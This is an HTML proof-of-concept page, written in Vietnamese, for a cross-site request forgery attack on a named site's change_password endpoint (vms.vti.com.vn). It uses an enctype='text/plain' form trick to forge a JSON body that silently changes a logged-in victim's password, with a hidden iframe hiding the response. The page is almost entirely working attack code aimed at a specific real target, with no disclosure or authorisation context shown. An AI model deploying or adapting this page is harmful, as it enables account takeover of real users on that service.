<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit PoC (Text/Plain Trick)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f9; }
        .container { max-width: 600px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { color: #d9534f; border-bottom: 2px solid #d9534f; padding-bottom: 10px; }
        button { background-color: #d9534f; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
        button:hover { background-color: #c9302c; }
        .status { margin-top: 15px; padding: 10px; background-color: #d9edf7; color: #31708f; border: 1px solid #bce8f1; border-radius: 4px; font-size: 14px; }
    </style>
</head>
<body>

<div class="container">
    <h2>⚠️ CSRF Vulnerability PoC (Bypass CORS via Form JSON Trick)</h2>
    <p><strong>Mục tiêu:</strong> <code>https://vti.com.vn</code></p>
    <p>Phương pháp này sử dụng <code>enctype="text/plain"</code> để ép trình duyệt gửi payload JSON bằng thẻ Form cũ, vượt qua mọi lớp chặn của CORS.</p>
    
    <!-- Form gửi POST request trực tiếp, kết quả trả về nạp vào iframe ẩn để không bị chuyển trang -->
    <form action="https://vms.vti.com.vn/myvti/change_password" method="POST" enctype="text/plain" target="hidden_iframe">
        
        <!-- 
           Mẹo kỹ thuật (Trick):
           - Thuộc tính 'name' chứa toàn bộ chuỗi JSON mong muốn cộng với một thuộc tính rác '"padding":"'
           - Thuộc tính 'value' chứa ký tự đóng ngoặc '"}'
           - Khi submit, trình duyệt tự nối: name=value -> Tạo ra chuỗi JSON hợp lệ gửi lên Body của Request.
        -->
        <input type="hidden" 
               name='{"params":{"old_password":"12345678","new_password":"123456789","confirm_password":"123456789"},"padding":"' 
               value='"}'>
        
        <button type="submit" onclick="showStatus()">Kích hoạt CSRF Attack</button>
    </form>

    <div class="status" id="status-text" style="display: none;">
        🚀 Request đã được trình duyệt tự động gửi đi kèm theo Session Cookie (nếu có)!<br>
        <i>Lưu ý: Do tấn công qua Form chéo nguồn, bạn không thể đọc nội dung Response trả về (CORS vẫn bảo vệ dữ liệu phản hồi).</i>
    </div>

    <!-- Iframe ẩn đóng vai trò "hứng" kết quả trả về từ server mục tiêu -->
    <iframe name="hidden_iframe" style="display:none;"></iframe>
</div>

<script>
function showStatus() {
    document.getElementById('status-text').style.display = 'block';
}
</script>

</body>
</html>
